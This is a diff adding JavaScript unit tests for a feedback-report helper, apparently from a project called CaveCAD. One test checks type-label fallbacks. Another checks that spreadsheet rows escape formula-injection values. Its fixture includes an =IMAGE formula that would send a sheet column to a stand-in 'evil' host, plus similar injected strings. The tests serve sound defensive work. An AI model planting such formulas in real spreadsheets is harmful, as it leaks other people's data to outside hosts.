@@ -47,3 +47,27 @@ test("stripPath and subject", () => {
   assert.strictEqual(L.stripPath("./logs/a.log"), "logs/a.log");
   assert.strictEqual(L.subject(REPORT).indexOf("[CaveCAD Feedback] Bug: "), 0);
 });
+
+test("typeLabel falls back to Bug for unknown types", () => {
+  assert.strictEqual(L.typeLabel("bug"), "Bug");
+  assert.strictEqual(L.typeLabel("idea"), "Idea");
+  assert.strictEqual(L.typeLabel("question"), "Question");
+  assert.strictEqual(L.typeLabel("weird"), "Bug");
+  assert.strictEqual(L.typeLabel(""), "Bug");
+  assert.strictEqual(L.typeLabel(undefined), "Bug");
+});
+
+test("row escapes formula-injection strings", () => {
+  const evil = { ...REPORT,
+    summary: '=IMAGE("https://evil/?"&JOIN(",",E:E))',
+    email: "+1;DROP",
+  };
+  const r = L.row(evil, new Date("2026-09-27T12:00:00Z"), "-https://evil", "FID", 3);
+  assert.strictEqual(r[L.COLUMNS.indexOf("Summary")], '\'=IMAGE("https://evil/?"&JOIN(",",E:E))');
+  assert.strictEqual(r[L.COLUMNS.indexOf("Email")], "'+1;DROP");
+  assert.strictEqual(r[L.COLUMNS.indexOf("Folder link")], "'-https://evil");
+  // ordinary values untouched
+  const ok = L.row(REPORT, new Date("2026-09-27T12:00:00Z"), "https://f", "FID", 3);
+  assert.strictEqual(ok[L.COLUMNS.indexOf("Folder link")], "https://f");
+  assert.strictEqual(ok[L.COLUMNS.indexOf("Summary")], REPORT.summary);
+});
